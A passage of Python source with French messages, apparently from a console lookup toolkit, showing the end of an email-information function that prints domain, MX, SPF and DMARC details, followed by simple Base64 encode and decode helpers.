        dmarc_records = info["dmarc_records"] if "dmarc_records" in info else None
        google_workspace = info["google_workspace"] if "google_workspace" in info else None
        microsoft_365 = info["microsoft_365"] if "microsoft_365" in info else None

        mx_servers_str = ' / '.join(mx_servers) if mx_servers else "N/A"
        spf_records_str = ' / '.join(spf_records) if spf_records else "N/A"
        dmarc_records_str = ' / '.join(dmarc_records) if dmarc_records else "N/A"
        google_workspace_str = "Oui" if google_workspace else "Non"
        microsoft_365_str = "Oui" if microsoft_365 else "Non"

        print(Colorate.Horizontal(Colors.green_to_blue, f"""
    [+] Email         : {email}
    [+] Nom           : {name or 'N/A'}
    [+] Domaine        : {domain or 'N/A'}
    [+] Tld           : {tld or 'N/A'}
    [+] Domaine All    : {domain_all or 'N/A'}
    [+] Serveurs MX     : {mx_servers_str}
    [+] Enregistrements SPF    : {spf_records_str}
    [+] Enregistrements DMARC   : {dmarc_records_str}
    [+] Google Workspace : {google_workspace_str}
    [+] Microsoft 365   : {microsoft_365_str}
    """))
            
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"Erreur inattendue : {str(e)}"))        


def convert_base64_to_text(base64_string):
    """
    Convertit une chaîne Base64 en texte.
    """
    try:
        # Décoder la chaîne Base64
        decoded_bytes = base64.b64decode(base64_string)
        decoded_text = decoded_bytes.decode('utf-8')
        print(Colorate.Horizontal(Colors.green_to_blue, f"Texte décodé : {decoded_text}"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"Erreur lors du décodage de la chaîne Base64 : {str(e)}"))

def convert_text_to_base64(text):
    """
    Convertit le texte en Base64.
    """
    try:
        # Encoder le texte en Base64
        encoded_text = base64.b64encode(text.encode('utf-8')).decode('utf-8')
        print(Colorate.Horizontal(Colors.green_to_blue, f"Texte en Base64 : {encoded_text}"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"Erreur lors de la conversion en Base64 : {str(e)}"))